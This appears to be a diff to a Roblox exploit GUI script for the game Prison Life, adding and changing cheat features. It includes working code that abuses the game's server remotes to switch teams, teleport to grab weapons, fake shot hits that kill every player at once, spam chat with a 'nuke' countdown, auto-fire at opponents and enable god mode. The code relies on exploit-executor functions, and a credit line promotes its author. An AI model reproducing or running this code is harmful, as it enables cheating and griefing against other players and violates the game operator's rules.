+G2L["103"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["103"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["103"]["Size"] = UDim2.new(0, 132, 0, 25);
+G2L["103"]["BorderColor3"] = Color3.fromRGB(56, 255, 0);
+G2L["103"]["Text"] = [[Change Border frame color]];
+G2L["103"]["Position"] = UDim2.new(0.24719101190567017, 0, 0.02777777798473835, 0);
+
+-- StarterGui.PrisonD0llan.Title.mainFrame.Config_page[5].TextButton.LocalScript
+G2L["104"] = Instance.new("LocalScript", G2L["103"]);
+
+
+-- StarterGui.PrisonD0llan.Title.mainFrame.Config_page[5].TextButton
+G2L["105"] = Instance.new("TextButton", G2L["100"]);
+G2L["105"]["TextWrapped"] = true;
+G2L["105"]["TextScaled"] = true;
+G2L["105"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["105"]["TextSize"] = 14;
+G2L["105"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["105"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["105"]["Size"] = UDim2.new(0, 119, 0, 25);
+G2L["105"]["BorderColor3"] = Color3.fromRGB(56, 255, 0);
+G2L["105"]["Text"] = [[Change Title border color]];
+G2L["105"]["Position"] = UDim2.new(0.49438202381134033, 0, 0.02777777798473835, 0);
+
+-- StarterGui.PrisonD0llan.Title.mainFrame.Config_page[5].TextButton.LocalScript
+G2L["106"] = Instance.new("LocalScript", G2L["105"]);
+
+
+-- StarterGui.PrisonD0llan.Title.mainFrame.Config_page[5].TextButton
+G2L["107"] = Instance.new("TextButton", G2L["100"]);
+G2L["107"]["TextWrapped"] = true;
+G2L["107"]["TextScaled"] = true;
+G2L["107"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["107"]["TextSize"] = 14;
+G2L["107"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["107"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["107"]["Size"] = UDim2.new(0, 151, 0, 25);
+G2L["107"]["BorderColor3"] = Color3.fromRGB(56, 255, 0);
+G2L["107"]["Text"] = [[Change All Pages color]];
+G2L["107"]["Position"] = UDim2.new(0.7172284722328186, 0, 0.02777777798473835, 0);
+
+-- StarterGui.PrisonD0llan.Title.mainFrame.Config_page[5].TextButton.LocalScript
+G2L["108"] = Instance.new("LocalScript", G2L["107"]);
+
+
+-- StarterGui.PrisonD0llan.Title.mainFrame.Config_page[5].TextButton
+G2L["109"] = Instance.new("TextButton", G2L["100"]);
+G2L["109"]["TextWrapped"] = true;
+G2L["109"]["TextScaled"] = true;
+G2L["109"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["109"]["TextSize"] = 14;
+G2L["109"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["109"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["109"]["Size"] = UDim2.new(0, 512, 0, 25);
+G2L["109"]["BorderColor3"] = Color3.fromRGB(56, 255, 0);
+G2L["109"]["Text"] = [[promote your social network in this Script]];
+G2L["109"]["Position"] = UDim2.new(0.02247191034257412, 0, 0.1041666641831398, 0);
+
+-- StarterGui.PrisonD0llan.Title.mainFrame.Config_page[5].TextButton.LocalScript
+G2L["10a"] = Instance.new("LocalScript", G2L["109"]);
+
+
+-- StarterGui.PrisonD0llan.Title.mainFrame.Config_page[5].TextLabel
+G2L["10b"] = Instance.new("TextLabel", G2L["100"]);
+G2L["10b"]["BorderSizePixel"] = 0;
+G2L["10b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["10b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["10b"]["TextSize"] = 14;
+G2L["10b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["10b"]["Size"] = UDim2.new(0, 532, 0, 13);
+G2L["10b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["10b"]["Text"] = [[¡Script by G0bbyD0llan57, Follow him on YT!]];
+G2L["10b"]["Position"] = UDim2.new(-0.00025545613607391715, 0, 0.9693641662597656, 0);
+
+-- StarterGui.PrisonD0llan.Title.mainFrame.Config_page[5].TextButton
+G2L["10c"] = Instance.new("TextButton", G2L["100"]);
+G2L["10c"]["TextWrapped"] = true;
+G2L["10c"]["AutoButtonColor"] = false;
+G2L["10c"]["TextScaled"] = true;
+G2L["10c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["10c"]["TextSize"] = 14;
+G2L["10c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["10c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["10c"]["Size"] = UDim2.new(0, 512, 0, 25);
+G2L["10c"]["BorderColor3"] = Color3.fromRGB(255, 0, 5);
+G2L["10c"]["Text"] = [[Current Version = 1.45]];
+G2L["10c"]["Position"] = UDim2.new(0.016853932291269302, 0, 0.8842592835426331, 0);
 
 -- StarterGui.PrisonD0llan.Title.LocalScript
-G2L["102"] = Instance.new("LocalScript", G2L["2"]);
+G2L["10d"] = Instance.new("LocalScript", G2L["2"]);
 
 
 -- StarterGui.PrisonD0llan.LocalScript
-G2L["103"] = Instance.new("LocalScript", G2L["1"]);
+G2L["10e"] = Instance.new("LocalScript", G2L["1"]);
 
 
 -- StarterGui.PrisonD0llan.Title.close.LocalScript
@@ -2536,18 +2616,132 @@ task.spawn(C_26);
 -- StarterGui.PrisonD0llan.Title.mainFrame.Exploits_page[1].Exploits.Teams.Police.LocalScript
 local function C_2c()
 	local script = G2L["2c"];
-	script.Parent.MouseButton1Click:Connect(function()
-		workspace.Remote.TeamEvent:FireServer("Bright blue")
+	local plr = game.Players.LocalPlayer
+	function MoveToJunk(v)
+		v.CFrame = CFrame.new(0,5^5,0)
+	end
 
+	local function getpos()
+		return game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+	end
+
+	local function GetCamPos()
+		return workspace.CurrentCamera.CFrame
+	end
+
+	local function GetTeam()
+		return game.Players.LocalPlayer.TeamColor.Name
+	end
+	function unsit()
+		game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid").Sit = false
+	end
+	function MoveTo(Pos,t)
+		unsit()
+		pcall(function()
+			if typeof(Pos):lower() == "position" then
+				Pos = CFrame.new(Pos)
+			end
+			for i =1,3 do
+				plr.Character:FindFirstChild("HumanoidRootPart").CFrame = Pos
+			end
+		end)
+	end
+	function ChangeTeam(Team)
+		if Team == game.Teams.Criminals then
+			local pos = getpos()
+			local crimpad = workspace["Criminals Spawn"].SpawnLocation
+			crimpad.CanCollide = false
+			crimpad.Transparency = 1
+			repeat task.wait()crimpad.CFrame = getpos() until plr.Team == game.Teams.Criminals
+			wait()
+			MoveTo(pos)
+			MoveToJunk(crimpad)
+			return
+		end
+		local a,b,c= nil,getpos(),workspace.CurrentCamera.CFrame
+		a =plr.CharacterAdded:Connect(function(Char)
+			task.spawn(function()
+				workspace.CurrentCamera:GetPropertyChangedSignal("CFrame"):Wait()
+				for i =1,5 do
+					workspace.CurrentCamera.CFrame = c
+				end
+			end)
+			Char:WaitForChild("HumanoidRootPart")
+			MoveTo(b)
+			a:Disconnect()
+		end)
+		local ohString1 = Team.TeamColor.Name
+		workspace.Remote.TeamEvent:FireServer(ohString1)
+		return
+	end
+	script.Parent.MouseButton1Click:Connect(function()
+		ChangeTeam("Guards")
 	end)
 end;
 task.spawn(C_2c);
 -- StarterGui.PrisonD0llan.Title.mainFrame.Exploits_page[1].Exploits.Teams.Inmate.LocalScript
 local function C_2e()
 	local script = G2L["2e"];
-	script.Parent.MouseButton1Click:Connect(function()
+	local plr = game.Players.LocalPlayer
+	function MoveToJunk(v)
+		v.CFrame = CFrame.new(0,5^5,0)
+	end
 
-		workspace.Remote.TeamEvent:FireServer("Bright orange")
+	local function getpos()
+		return game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+	end
+
+	local function GetCamPos()
+		return workspace.CurrentCamera.CFrame
+	end
+
+	local function GetTeam()
+		return game.Players.LocalPlayer.TeamColor.Name
+	end
+	function unsit()
+		game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid").Sit = false
+	end
+	function MoveTo(Pos,t)
+		unsit()
+		pcall(function()
+			if typeof(Pos):lower() == "position" then
+				Pos = CFrame.new(Pos)
+			end
+			for i =1,3 do
+				plr.Character:FindFirstChild("HumanoidRootPart").CFrame = Pos
+			end
+		end)
+	end
+	function ChangeTeam(Team)
+		if Team == game.Teams.Criminals then
+			local pos = getpos()
+			local crimpad = workspace["Criminals Spawn"].SpawnLocation
+			crimpad.CanCollide = false
+			crimpad.Transparency = 1
+			repeat task.wait()crimpad.CFrame = getpos() until plr.Team == game.Teams.Criminals
+			wait()
+			MoveTo(pos)
+			MoveToJunk(crimpad)
+			return
+		end
+		local a,b,c= nil,getpos(),workspace.CurrentCamera.CFrame
+		a =plr.CharacterAdded:Connect(function(Char)
+			task.spawn(function()
+				workspace.CurrentCamera:GetPropertyChangedSignal("CFrame"):Wait()
+				for i =1,5 do
+					workspace.CurrentCamera.CFrame = c
+				end
+			end)
+			Char:WaitForChild("HumanoidRootPart")
+			MoveTo(b)
+			a:Disconnect()
+		end)
+		local ohString1 = Team.TeamColor.Name
+		workspace.Remote.TeamEvent:FireServer(ohString1)
+		return
+	end
+	script.Parent.MouseButton1Click:Connect(function()
+		ChangeTeam("Inmates")
 	end)
 end;
 task.spawn(C_2e);
@@ -8860,6 +9054,7 @@ local function C_bf()
 	end
 	function All_Guns()
 		local saved = game:GetService("Players").LocalPlayer.Character:GetPrimaryPartCFrame()
+		wait(0.1)
 		if game:GetService("MarketplaceService"):UserOwnsGamePassAsync(plr.UserId, 96651) then
 			GetGun("M4A1",true)
 		end
@@ -8868,6 +9063,8 @@ local function C_bf()
 			GetGun("Remington 870",true)
 		end)
 		GetGun("M9",true)
+		game:GetService("Players").LocalPlayer.Character:SetPrimaryPartCFrame(saved)
+		wait()
 		game:GetService("Players").LocalPlayer.Character:SetPrimaryPartCFrame(saved)
 	end
 
@@ -9232,7 +9429,7 @@ local function C_c3()
 		end)
 	end
 
-	function car()
+	local function FastPunch()
 		while wait(.1) do
 			getsenv(game.Players.LocalPlayer.Character.ClientInputHandler).cs.isFighting = false
 		end
@@ -9241,7 +9438,7 @@ local function C_c3()
 
 
 	script.Parent.MouseButton1Click:Connect(function()
-		car()
+		FastPunch()
 	end)
 end;
 task.spawn(C_c3);
@@ -9387,7 +9584,7 @@ local function C_c5()
 			end
 			v2.Character:FindFirstChildOfClass("Humanoid").AnimationPlayed:Connect(function(animationTrack)
 				if animationTrack.Animation.AnimationId == "rbxassetid://484200742" or animationTrack.Animation.AnimationId =="rbxassetid://484926359" then
-					if (plr.Character.HumanoidRootPart.Position-v2.Character.HumanoidRootPart.Position).magnitude <3.5 then
+					if (plr.Character.HumanoidRootPart.Position-v2.Character.HumanoidRootPart.Position).magnitude <4.5 then
 						for i =1,13 do
 							task.spawn(function()
 								game.ReplicatedStorage["meleeEvent"]:FireServer(v2)
@@ -10722,60 +10919,20 @@ task.spawn(C_d6);
 local function C_d8()
 	local script = G2L["d8"];
 	script.Parent.MouseButton1Click:Connect(function()
-		-- Get the local player
-		local player = game.Players.LocalPlayer
-		local Mouse, mouse, IYmouse = player:GetMouse(), player:GetMouse(), player:GetMouse()
-		-- Function to equip the first tool from the backpack
-		local function equipFirstToolIfNotToolInCharacter()
-			local character = player.Character
-			local humanoid = character and character:FindFirstChildOfClass("Humanoid")
-
-			if humanoid and not character:FindFirstChildWhichIsA("Tool") then
-				local tools = player.Backpack:GetChildren()
-
-				for _, tool in pairs(tools) do
-					if tool:IsA("Tool") then
-						humanoid:EquipTool(tool)
-						break
+		--BROUGHT TO YOU BY RSCRIPTS.NET--
+		--Modified by G0bbyD0llan--
+		local player = game:GetService("Players").LocalPlayer
+		local mouse = player:GetMouse()
+		game:GetService("RunService").RenderStepped:Connect(function()
+			if mouse.Target.Parent:FindFirstChild("Humanoid") and mouse.Target.Parent.Name ~= player.Name then
+				local target = game:GetService("Players"):FindFirstChild(mouse.Target.Parent.Name)
+				if target.TeamColor ~= player.TeamColor then
+					if player.Character:FindFirstChildWhichIsA("Tool") then
+						mouse1press() wait() mouse1release()
 					end
 				end
 			end
-		end
-		local function shoot()
-			if mouse1press and mouse1release then
-				mouse1press() wait() Mouse1release()
-			else
-				script.Parent.Text = "Theres not function for mouse"
-			end
-		end
-		-- Function to check if the target player's team color is different
-		local function checkTeamColor(targetPlayer)
-			if player.TeamColor.Name ~= targetPlayer.TeamColor.Name then
-				return false
-			elseif player.TeamColor.Name == targetPlayer.TeamColor.Name then
-				return true
-			end
-		end
-
-		-- Connect the functions to the mouse click event
-		local function onMouseClick()
-			local mouse = player:GetMouse()
-			local target = mouse.Target
-
-			if target and target:IsA("Model") and target:FindFirstChildOfClass("Humanoid") then
-				local targetPlayer = game.Players:GetPlayerFromCharacter(target)
-
-				if targetPlayer then
-					if not checkTeamColor(targetPlayer) and game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Tool") then
-						shoot()
-					end
-				end
-			end
-		end
-
-		-- Connect the onMouseClick function to the mouse button click event
-		mouse.Move:Connect(onMouseClick)
-
+		end)
 	end)
 end;
 task.spawn(C_d8);
@@ -11228,7 +11385,7 @@ local function C_de()
 	end
 	function All_Guns()
 		local saved = game:GetService("Players").LocalPlayer.Character:GetPrimaryPartCFrame()
-		if game:GetService("MarketplaceService"):UserOwnsGamePassAsync(plr.UserId, 96651) then
+		if game:GetService("MarketplaceService"):UserOwnsGamePassAsync(plr.UserId, 96651) or game:GetService("MarketplaceService"):UserOwnsGamePassAsync(plr.UserId, 643697197) then
 			GetGun("M4A1",true)
 		end
 		GetGun("AK-47",true)
@@ -12669,7 +12826,7 @@ local function C_ea()
 		end
 	end
 	script.Parent.MouseButton1Click:Connect(function()
-
+		givenukeTo(plr)
 	end)
 end;
 task.spawn(C_ea);
@@ -12948,9 +13105,1498 @@ local function C_ec()
 	end)
 end;
 task.spawn(C_ec);
--- StarterGui.PrisonD0llan.Title.mainFrame.IntroLabel.LocalScript
+-- StarterGui.PrisonD0llan.Title.mainFrame.LocalPlayer_page[4].TextButton.LocalScript
 local function C_ee()
 	local script = G2L["ee"];
+	while true do
+		for i = 1, 360 do
+			script.Parent.BorderColor3 = Color3.fromHSV(i / 360, 1, 1)
+			task.wait()
+		end
+	end
+end;
+task.spawn(C_ee);
+-- StarterGui.PrisonD0llan.Title.mainFrame.LocalPlayer_page[4].TextButton.LocalScript
+local function C_ef()
+	local script = G2L["ef"];
+	firetouchinterest=firetouchinterest
+
+	local plr =  game.Players.LocalPlayer
+	function MoveToJunk(v)
+		v.CFrame = CFrame.new(0,5^5,0)
+	end
+	function GetGun(Item,Ignore)
+		local saved = game:GetService("Players").LocalPlayer.Character:GetPrimaryPartCFrame()
+		if workspace.Prison_ITEMS.giver:FindFirstChild(Item) and workspace.Prison_ITEMS.giver:FindFirstChild(Item):FindFirstChild("ITEMPICKUP") then
+			Item =workspace.Prison_ITEMS.giver:FindFirstChild(Item)
+			local ohInstance1 = Item:FindFirstChildOfClass("Part")
+			MoveTo(CFrame.new(ohInstance1.Position))
+			repeat wait()
+				local ohInstance1 = Item:FindFirstChildOfClass("Part")
+				MoveTo(CFrame.new(ohInstance1.Position))
+				task.spawn(function()
+					workspace.Remote.ItemHandler:InvokeServer(ohInstance1)
+				end)
+				wait()
+			until plr.Backpack:FindFirstChild(Item.Name) or plr.Character:FindFirstChild(Item.Name)
+		end
+		if Ignore ~= true then
+			plr.Character:SetPrimaryPartCFrame(Ignore or saved)
+		end
+	end
+	local function getpos()
+		return game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+	end
+
+	local function GetCamPos()
+		return workspace.CurrentCamera.CFrame
+	end
+
+	local function GetTeam()
+		return game.Players.LocalPlayer.TeamColor.Name
+	end
+	local function GetPlayer(String)
+		if not String then return end
+		local Yes = {}
+		for _, Player in ipairs(game.Players:GetPlayers()) do
+			if string.lower(Player.Name):match(string.lower(String)) or string.lower(Player.DisplayName):match(string.lower(String)) then
+				table.insert(Yes, Player)
+			end
+		end
+		if #Yes > 0 then
+			return Yes[1]
+		elseif #Yes < 1 then
+			return nil
+		end
+	end
+	function unsit()
+		game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid").Sit = false
+	end
+	function MoveTo(Pos,t)
+		unsit()
+		pcall(function()
+			if typeof(Pos):lower() == "position" then
+				Pos = CFrame.new(Pos)
+			end
+			for i =1,3 do
+				plr.Character:FindFirstChild("HumanoidRootPart").CFrame = Pos
+			end
+		end)
+	end
+	function ChangeTeam(Team)
+		if Team == game.Teams.Criminals then
+			local pos = getpos()
+			local crimpad = workspace["Criminals Spawn"].SpawnLocation
+			crimpad.CanCollide = false
+			crimpad.Transparency = 1
+			repeat task.wait()crimpad.CFrame = getpos() until plr.Team == game.Teams.Criminals
+			wait()
+			MoveTo(pos)
+			MoveToJunk(crimpad)
+			return
+		end
+		local a,b,c= nil,getpos(),workspace.CurrentCamera.CFrame
+		a =plr.CharacterAdded:Connect(function(Char)
+			task.spawn(function()
+				workspace.CurrentCamera:GetPropertyChangedSignal("CFrame"):Wait()
+				for i =1,5 do
+					workspace.CurrentCamera.CFrame = c
+				end
+			end)
+			Char:WaitForChild("HumanoidRootPart")
+			MoveTo(b)
+			a:Disconnect()
+		end)
+		local ohString1 = Team.TeamColor.Name
+		workspace.Remote.TeamEvent:FireServer(ohString1)
+		return
+	end
+	function Valid_Team(Team)
+		if Team and typeof(Team):lower()=="string" then
+			local Valid = {
+				"Bright orange",
+				"Bright blue",
+			}
+			if table.find(Valid,Team) then
+				return true
+			elseif Team == "Really red" then
+				return 1
+			end
+			return nil
+		end
+	end
+	function Last_Team(Lastteam)
+		task.spawn(function()
+			local a,b,c= nil,getpos(),workspace.CurrentCamera.CFrame
+			a =plr.CharacterAdded:Connect(function(Char)
+				task.spawn(function()
+					workspace.CurrentCamera:GetPropertyChangedSignal("CFrame"):Wait()
+					for i =1,5 do
+						workspace.CurrentCamera.CFrame = c
+					end
+				end)
+				Char:WaitForChild("HumanoidRootPart")
+				MoveTo(b)
+				a:Disconnect()
+			end)
+			local Team = Valid_Team(Lastteam)
+			if Team and Team~=1 then
+				local pos = getpos()
+				workspace.Remote.TeamEvent:FireServer(Lastteam)
+			elseif Team and Team == 1 then
+				workspace.Remote.TeamEvent:FireServer("Bright orange")
+				local crimpad = workspace["Criminals Spawn"].SpawnLocation
+				crimpad.CanCollide = false
+				crimpad.Transparency = 1
+				repeat task.wait()crimpad.CFrame = getpos() until plr.Team == game.Teams.Criminals
+				MoveToJunk(crimpad)
+			end
+		end)
+	end
+	loadchar = function()
+		if plr.Team == game.Teams.Inmates then
+			local ohString1 = "Bright orange"
+			workspace.Remote.TeamEvent:FireServer(ohString1)
+		elseif plr.Team == game.Teams.Guards then
+
+			local ohString1 = "Bright blue"
+			workspace.Remote.TeamEvent:FireServer(ohString1)
+		elseif plr.Team == game.Teams.Criminals then
+			workspace.Remote.TeamEvent:FireServer("Bright orange")
+			wait(.3)
+			local crimpad = workspace["Criminals Spawn"].SpawnLocation
+			crimpad.CanCollide = false
+			crimpad.Transparency = 1
+			repeat task.wait()crimpad.CFrame = getpos() until plr.Team == game.Teams.Criminals
+			MoveToJunk(crimpad)
+		end
+	end
+	local Resfreshing = false
+	function refresh(Pos)
+		if not Pos then
+			Pos = getpos()
+		end
+		Resfreshing = true
+		local Goto = Pos or getpos()
+		local Connections = {}
+		local Cam = workspace.CurrentCamera.CFrame
+		Connections[1] = plr.CharacterAdded:Connect(function(charnew)
+			pcall(function()
+				task.spawn(function()
+					workspace.CurrentCamera:GetPropertyChangedSignal("CFrame"):Wait()
+					for i =1,5 do
+						workspace.CurrentCamera.CFrame = Cam
+					end
+				end)
+				repeat task.wait() until charnew and charnew:FindFirstChild("HumanoidRootPart")
+				MoveTo(Goto)
+				task.spawn(function()
+					wait(.05)
+					MoveTo(Goto)
+					Resfreshing = false
+				end)
+				Connections[1]:Disconnect()
+			end)
+		end)
+		loadchar()
+		print("Refreshed")
+		return
+	end
+
+	function Kill_All(TeamS)
+		local a = GetTeam()
+		local saved = getpos()
+		local Team = GetTeam()
+		if not TeamS then
+			ChangeTeam(game.Teams.Inmates)
+		end
+		GetGun("M9")
+		repeat task.wait() until plr.Backpack:FindFirstChild("M9")
+		local Gun = plr.Backpack:FindFirstChild("M9")
+		local Gen = {}
+		if TeamS then
+			if TeamS == game.Teams.Guards then
+				ChangeTeam(game.Teams.Inmates)
+			elseif TeamS == game.Teams.Inmates then
+				ChangeTeam(game.Teams.Criminals)
+			end
+		end
+		if not TeamS then
+			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+				if  v ~= plr then
+					if v.Team == game.Teams.Criminals then
+						for i =1,10 do
+							Gen[#Gen+1]={
+								["RayObject"] = Ray.new(Vector3.new(0,0,0), Vector3.new(0,0,0)),
+								["Distance"] = .1,
+								["Cframe"] = CFrame.new(),
+								["Hit"] = v.Character:WaitForChild("Head")
+							}
+						end
+					end
+				end
+			end
+			game:GetService("ReplicatedStorage").ShootEvent:FireServer(Gen, Gun)
+		end
+		--
+		if not TeamS then
+			ChangeTeam(game.Teams.Criminals)
+		end
+		for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+			if  v ~= plr then
+				if (TeamS and v.Team == TeamS) or not TeamS then
+					for i =1,10 do
+						Gen[#Gen+1]={
+							["RayObject"] = Ray.new(Vector3.new(0,0,0), Vector3.new(0,0,0)),
+							["Distance"] = .1,
+							["Cframe"] = CFrame.new(),
+							["Hit"] = v.Character:WaitForChild("Head")
+						}
+					end
+				end
+			end
+		end
+		game:GetService("ReplicatedStorage").ShootEvent:FireServer(Gen, Gun)
+		wait(.1)
+		Last_Team(a)
+		wait(.4)
+		game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = saved
+	end
+	local function givenukeTo(plrRRr)
+		if plrRRr then
+			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("!!!A NUKE HAS BEEN PLACED ON "..plrRRr.Name.." KILLING HIM WILL GET EVERYONE DEAD!!!", "ALL")
+			repeat task.wait()
+				if plrRRr.Character and plrRRr.Character:FindFirstChildOfClass("Humanoid") and plrRRr.Character:FindFirstChildOfClass("Humanoid").Health <1 then
+					break
+				end
+			until not game
+			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(plrRRr.Name.." IS DEAD NUKE LAUNCHING!!!", "ALL")
+			wait(1.5)
+			--//This is what I call perfect work 
+			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("LAUNCHING IN 3", "ALL")
+			wait(1.5)
+			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("LAUNCHING IN 2", "ALL")			
+			wait(1.5)
+			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("LAUNCHING IN 1", "ALL")
+			wait(2)
+			Kill_All()
+		end
+	end
+	local God_Mode = false
+	script.Parent.MouseButton1Click:Connect(function()
+		God_Mode = not God_Mode
+		if God_Mode then
+			script.Parent.Text = "disable God mode"
+		elseif not God_Mode then
+			script.Parent.Text = "god mode"
+		end
+
+		while wait() do
+			if God_Mode then
+				game.Players.LocalPlayer.Character.Humanoid.Name = 1
+				local l = game.Players.LocalPlayer.Character["1"]:Clone()
+				l.Parent = game.Players.LocalPlayer.Character
+				l.Name = "Humanoid"
+				game.Players.LocalPlayer.Character.Animate.Disabled = true
+				wait()
+				game.Players.LocalPlayer.Character.Animate.Disabled = false
+				game.Players.LocalPlayer.Character["1"]:Destroy()
+				game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
+				wait(5)
+				local savedcf = getpos()
+				local savedcamcf = GetCamPos()
+				local savedteam = GetTeam()
+				workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new(savedteam).Name)
+				workspace.CurrentCamera.CFrame = savedcamcf
+				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
+			end
+		end
+	end)
+end;
+task.spawn(C_ef);
+-- StarterGui.PrisonD0llan.Title.mainFrame.LocalPlayer_page[4].TextButton.LocalScript
+local function C_f1()
+	local script = G2L["f1"];
+	firetouchinterest=firetouchinterest
+
+	local plr =  game.Players.LocalPlayer
+	function MoveToJunk(v)
+		v.CFrame = CFrame.new(0,5^5,0)
+	end
+	function GetGun(Item,Ignore)
+		local saved = game:GetService("Players").LocalPlayer.Character:GetPrimaryPartCFrame()
+		if workspace.Prison_ITEMS.giver:FindFirstChild(Item) and workspace.Prison_ITEMS.giver:FindFirstChild(Item):FindFirstChild("ITEMPICKUP") then
+			Item =workspace.Prison_ITEMS.giver:FindFirstChild(Item)
+			local ohInstance1 = Item:FindFirstChildOfClass("Part")
+			MoveTo(CFrame.new(ohInstance1.Position))
+			repeat wait()
+				local ohInstance1 = Item:FindFirstChildOfClass("Part")
+				MoveTo(CFrame.new(ohInstance1.Position))
+				task.spawn(function()
+					workspace.Remote.ItemHandler:InvokeServer(ohInstance1)
+				end)
+				wait()
+			until plr.Backpack:FindFirstChild(Item.Name) or plr.Character:FindFirstChild(Item.Name)
+		end
+		if Ignore ~= true then
+			plr.Character:SetPrimaryPartCFrame(Ignore or saved)
+		end
+	end
+	local function getpos()
+		return game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+	end
+
+	local function GetCamPos()
+		return workspace.CurrentCamera.CFrame
+	end
+
+	local function GetTeam()
+		return game.Players.LocalPlayer.TeamColor.Name
+	end
+	local function GetPlayer(String)
+		if not String then return end
+		local Yes = {}
+		for _, Player in ipairs(game.Players:GetPlayers()) do
+			if string.lower(Player.Name):match(string.lower(String)) or string.lower(Player.DisplayName):match(string.lower(String)) then
+				table.insert(Yes, Player)
+			end
+		end
+		if #Yes > 0 then
+			return Yes[1]
+		elseif #Yes < 1 then
+			return nil
+		end
+	end
+	function unsit()
+		game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid").Sit = false
+	end
+	function MoveTo(Pos,t)
+		unsit()
+		pcall(function()
+			if typeof(Pos):lower() == "position" then
+				Pos = CFrame.new(Pos)
+			end
+			for i =1,3 do
+				plr.Character:FindFirstChild("HumanoidRootPart").CFrame = Pos
+			end
+		end)
+	end
+	function ChangeTeam(Team)
+		if Team == game.Teams.Criminals then
+			local pos = getpos()
+			local crimpad = workspace["Criminals Spawn"].SpawnLocation
+			crimpad.CanCollide = false
+			crimpad.Transparency = 1
+			repeat task.wait()crimpad.CFrame = getpos() until plr.Team == game.Teams.Criminals
+			wait()
+			MoveTo(pos)
+			MoveToJunk(crimpad)
+			return
+		end
+		local a,b,c= nil,getpos(),workspace.CurrentCamera.CFrame
+		a =plr.CharacterAdded:Connect(function(Char)
+			task.spawn(function()
+				workspace.CurrentCamera:GetPropertyChangedSignal("CFrame"):Wait()
+				for i =1,5 do
+					workspace.CurrentCamera.CFrame = c
+				end
+			end)
+			Char:WaitForChild("HumanoidRootPart")
+			MoveTo(b)
+			a:Disconnect()
+		end)
+		local ohString1 = Team.TeamColor.Name
+		workspace.Remote.TeamEvent:FireServer(ohString1)
+		return
+	end
+	function Valid_Team(Team)
+		if Team and typeof(Team):lower()=="string" then
+			local Valid = {
+				"Bright orange",
+				"Bright blue",
+			}
+			if table.find(Valid,Team) then
+				return true
+			elseif Team == "Really red" then
+				return 1
+			end
+			return nil
+		end
+	end
+	function Last_Team(Lastteam)
+		task.spawn(function()
+			local a,b,c= nil,getpos(),workspace.CurrentCamera.CFrame
+			a =plr.CharacterAdded:Connect(function(Char)
+				task.spawn(function()
+					workspace.CurrentCamera:GetPropertyChangedSignal("CFrame"):Wait()
+					for i =1,5 do
+						workspace.CurrentCamera.CFrame = c
+					end
+				end)
+				Char:WaitForChild("HumanoidRootPart")
+				MoveTo(b)
+				a:Disconnect()
+			end)
+			local Team = Valid_Team(Lastteam)
+			if Team and Team~=1 then
+				local pos = getpos()
+				workspace.Remote.TeamEvent:FireServer(Lastteam)
+			elseif Team and Team == 1 then
+				workspace.Remote.TeamEvent:FireServer("Bright orange")
+				local crimpad = workspace["Criminals Spawn"].SpawnLocation
+				crimpad.CanCollide = false
+				crimpad.Transparency = 1
+				repeat task.wait()crimpad.CFrame = getpos() until plr.Team == game.Teams.Criminals
+				MoveToJunk(crimpad)
+			end
+		end)
+	end
+	loadchar = function()
+		if plr.Team == game.Teams.Inmates then
+			local ohString1 = "Bright orange"
+			workspace.Remote.TeamEvent:FireServer(ohString1)
+		elseif plr.Team == game.Teams.Guards then
+
+			local ohString1 = "Bright blue"
+			workspace.Remote.TeamEvent:FireServer(ohString1)
+		elseif plr.Team == game.Teams.Criminals then
+			workspace.Remote.TeamEvent:FireServer("Bright orange")
+			wait(.3)
+			local crimpad = workspace["Criminals Spawn"].SpawnLocation
+			crimpad.CanCollide = false
+			crimpad.Transparency = 1
+			repeat task.wait()crimpad.CFrame = getpos() until plr.Team == game.Teams.Criminals
+			MoveToJunk(crimpad)
+		end
+	end
+	local Resfreshing = false
+	function refresh(Pos)
+		if not Pos then
+			Pos = getpos()
